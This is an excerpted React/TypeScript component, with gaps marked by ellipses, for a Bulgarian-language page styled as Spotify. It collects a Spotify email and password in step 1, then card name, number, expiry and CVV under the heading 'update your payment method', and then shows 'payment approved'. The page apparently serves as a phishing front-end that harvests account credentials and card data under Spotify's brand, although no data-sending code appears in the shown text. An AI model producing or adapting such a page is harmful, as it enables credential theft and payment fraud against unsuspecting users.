...
  // --- Bulgarian Translations for Errors ---
  const BULGARIAN_ERRORS = {
    INVALID_EMAIL: "Този имейл е невалиден. Уверете се, че е написан във формат: пример@имейл.com",
    EMPTY_PASSWORD: "Трябва да въведете парола.",
    SHORT_PASSWORD: "Вашата парола трябва да е поне 8 символа.",
    EMPTY_NAME: "Въведете името върху картата.",
    EMPTY_CARD: "Въведете номер на карта.",
    INVALID_CARD: "Въведете валиден номер на карта.",
    EMPTY_EXPIRY: "Въведете дата на изтичане.",
    INVALID_EXPIRY_FORMAT: "Използвайте формат ММ / ГГ.",
    INVALID_EXPIRY_MONTH: "Въведете валиден месец.",
    CARD_EXPIRED: "Вашата карта е изтекла.",
    EMPTY_CVV: "Въведете CVV.",
    INVALID_CVV: "Въведете 3-цифрен CVV.",
  }


  const validateEmail = (emailValue: string) => {
    if (!emailValue) {
        setEmailError(BULGARIAN_ERRORS.INVALID_EMAIL);
        return false;
    }
...
    if (!passwordValue) {
      setPasswordError(BULGARIAN_ERRORS.EMPTY_PASSWORD);
      return false;
    }
    if (passwordValue.length < 8) {
      setPasswordError(BULGARIAN_ERRORS.SHORT_PASSWORD);
      return false;
    }
...
    if (!value.trim()) {
        setNameError(BULGARIAN_ERRORS.EMPTY_NAME);
        return false;
    }
    setNameError(null);
    return true;
...
      if (!value) {
          setCardNumberError(BULGARIAN_ERRORS.EMPTY_CARD);
          return false;
      }
      if (!isValidCardNumber(value)) {
          setCardNumberError(BULGARIAN_ERRORS.INVALID_CARD);
          return false;
      }
...
      if (!value) {
          setExpiryDateError(BULGARIAN_ERRORS.EMPTY_EXPIRY);
          return false;
      }
      const parts = value.split(' / ');
      if (parts.length !== 2 || parts[0].length !== 2 || parts[1].length !== 2) {
          setExpiryDateError(BULGARIAN_ERRORS.INVALID_EXPIRY_FORMAT);
          return false;
      }
  
...
          setExpiryDateError(BULGARIAN_ERRORS.INVALID_EXPIRY_MONTH);
          return false;
      }
  
      const now = new Date();
...
          setExpiryDateError(BULGARIAN_ERRORS.CARD_EXPIRED);
          return false;
      }
  
...
      if (!value) {
          setCvvError(BULGARIAN_ERRORS.EMPTY_CVV);
          return false;
      }
      if (!/^\d{3}$/.test(value)) {
          setCvvError(BULGARIAN_ERRORS.INVALID_CVV);
          return false;
      }
      setCvvError(null);
      return true;
...
                    <div>
                        <p className="text-xs font-bold text-zinc-400">Стъпка 1 от 3</p>
                        <h1 className="text-2xl font-extrabold">Вход в Spotify</h1>
                    </div>
                </div>
...
                <div className="flex items-center space-x-4 mb-6">
                    <div>
                        <p className="text-xs font-bold text-zinc-400">Стъпка 2 от 3</p>
                        <h1 className="text-2xl font-extrabold">Актуализирай своя метод на плащане</h1>
                    </div>
                </div>
...
                        <CheckmarkIcon />
                    </div>
                    <h1 className="text-3xl font-extrabold mb-4">Плащането е одобрено</h1>
                    <p className="text-zinc-300 mb-10 max-w-xs">
                        Плащането Ви беше успешно обработено. Можете да започнете да слушате веднага.
                    </p>
...
            <p>
                <a href="#" className="underline hover:text-[#1DB954] transition-colors">Политика за поверителност</a> и <a href="#" className="underline hover:text-[#1DB954] transition-colors">Условия за ползване</a> важат.
            </p>
        </footer>
    </div>
  );
